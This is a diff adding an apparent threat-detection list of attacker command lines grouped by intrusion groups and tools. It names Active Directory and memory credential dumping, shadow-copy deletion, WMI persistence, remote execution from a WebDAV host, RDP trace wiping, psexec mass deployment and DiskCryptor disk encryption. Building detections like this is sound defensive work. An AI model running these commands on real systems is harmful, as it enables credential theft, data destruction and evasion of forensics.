@@ -1,0 +1,69 @@
+# PAExec
+-sname
+
+# Dirty Wolf
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\programdata\activedirectory' q q
+AppData\Roaming\Telegram Desktop\tdata
+
+# Gremlin Wolf
+cmd.exe /c start \\expo-forum.net\DavWWWRoot\expo-forum\Akt_sdachi_priemki_PMFG_2024.pdf
+\\expo-forum.net\DavWWWRoot\node.exe \\expo-forum.net\DavWWWRoot\image
+node.exe \\
+cmd.exe /c C:\Windows\Temp\procdump.exe -accepteula -r -ma
+C:\Windows\Temp
+rundll32 C:\Windows\system32\comsvcs.dll,MiniDump
+wmic path win32_networkadapter where "NetEnabled='TRUE'" call disable
+product get name
+AntiVirusProduct
+computersystem get domain
+computersystem get name
+os get installdate
+product list brief
+process call create
+shadowcopy delete
+EventFilter
+FilterToConsumerBinding
+CommandLineEventConsumer
+ActiveScriptEventConsumer
+
+# Ngrok
+tcp 3389
+
+# Shadow Wolf
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Users\Public\Temp\log' q q
+powershell.exe -ex bypass -f Get-RDPLogs.ps1 -ComputerName
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+attrib -s -h %userprofile%\documents\Default.rdp
+del %userprofile%\documents\Default.rdp
+del /f /s /q /a %AppData%\Microsoft\Windows\Recent\AutomaticDestinations 
+
+# ADRecon
+-GenExcel
+-OutputDir
+-Collect
+-OutputType
+
+# Rclone
+copy
+--max-age
+--exclude
+--ignore-existing
+--auto-confirm
+--multi-thread-streams
+--transfers
+
+# Enigma Wolf
+for /f "delims=" %%i in (host.txt) do ( start psexec.exe -accepteula \\%%i -f -s -c "rdpe.bat" )
+for /f "delims=" %%i in (host.txt) do ( start psexec.exe -accepteula \\%%i -s C:\tmp\mesh.exe -fullinstall ping 127.0.0.1 -n 1 )
+
+# MeshCentral
+-fullinstall
+
+# DiskCryptor
+start "C:\'Program Files'\dcrypt\dccon.exe" -encrypt Z:\ -p
+for /f "delims=" %%i (host.txt) do ( start psexec.exe -accepteula \\%%i -s shutdown -r -f -t 30 ping 127.0.0.1 -n 1 )
+
+# Do not remove the line
+
